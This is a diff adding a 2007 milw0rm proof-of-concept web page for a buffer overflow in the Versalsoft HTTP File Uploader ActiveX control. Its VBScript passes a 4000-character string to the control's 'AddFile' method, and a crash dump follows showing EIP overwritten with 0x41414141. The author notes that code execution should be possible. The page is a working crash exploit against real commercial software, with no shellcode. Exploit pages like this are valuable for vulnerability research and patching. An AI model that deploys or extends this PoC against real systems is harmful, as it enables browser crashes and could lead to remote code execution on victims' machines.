@@ -1,0 +1,71 @@
+<span style="font: 14pt Courier New;"><p align="center"><b>2007/05/07</b></p></span>
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-------------------------------------------------------------------------------------
+ <b>Versalsoft HTTP File Uploader (UFileUploaderD.dll) 'AddFile' method Buffer Overflow</b>
+ url: http://en.versalsoft.com/
+ price: from $59.95 to $799.95
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+ Try only 1500 characters (or less) to see IE crash.
+-------------------------------------------------------------------------------------
+
+<object classid='clsid:28776DAD-5914-42A7-9139-8FD7C756BBDD' id='target' style="width: 650px; height: 250px"></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test"> <input language=VBScript onclick=QuoteMe() type=button value="Quoting...">
+
+<script language='vbscript'>
+Sub tryMe
+  on error resume next
+  arg1 = String (4000,"A")
+  target.AddFile arg1
+End Sub
+
+Sub QuoteMe
+ Dim MyMsg
+ MyMsg = MsgBox("I'm coming down with a fever" & vbCrLf & _
+                "I'm really out to sea" & vbCrLf & _
+                "This kettle is boiling over" & vbCrLf & _
+                "I think I'm a banana tree", 64, "2007/05/07 - Versalsoft HTTP File Uploader")
+End Sub
+</script><b><font color="#FF0000">As you can see by the faultmon dump, EIP is overwrite so code execution should
+be possible... but I leave to posterity the hardest part of work :)</font color></b>
+
+11:40:51.172  pid=08E4 tid=0AB0  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [41414141])
+              ----------------------------------------------------------------
+              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ECX=FFFFFFFF: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDX=0173E650: 00 00 00 00 41 41 41 41-D8 E8 73 01 FA 37 81 7C
+              ESP=0173E63C: F0 E8 73 01 95 E0 80 7C-50 E6 73 01 41 41 41 41
+              EBP=0173E658: D8 E8 73 01 FA 37 81 7C-41 41 41 41 A8 42 E7 02
+              ESI=7FFDABF8: 0A 00 0A 02 00 AC FD 7F-61 00 62 00 6F 00 75 00
+              EDI=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EIP=7C9112B4: F2 AE F7 D1 81 F9 FF FF-00 00 76 05 B9 FF FF 00
+                            --> REPNZ SCASB
+              ----------------------------------------------------------------
+
+11:40:51.172  pid=08E4 tid=0AB0  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [41414141])
+              ----------------------------------------------------------------
+              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDX=7C9137D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
+              ESP=0173E26C: BF 37 91 7C 54 E3 73 01-84 F2 73 01 70 E3 73 01
+              EBP=0173E28C: 3C E3 73 01 8B 37 91 7C-54 E3 73 01 84 F2 73 01
+              ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EIP=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+                            --> N/A
+              ----------------------------------------------------------------
+To be continued...</span></span>
+</code></pre>
+
+# milw0rm.com [2007-05-07]
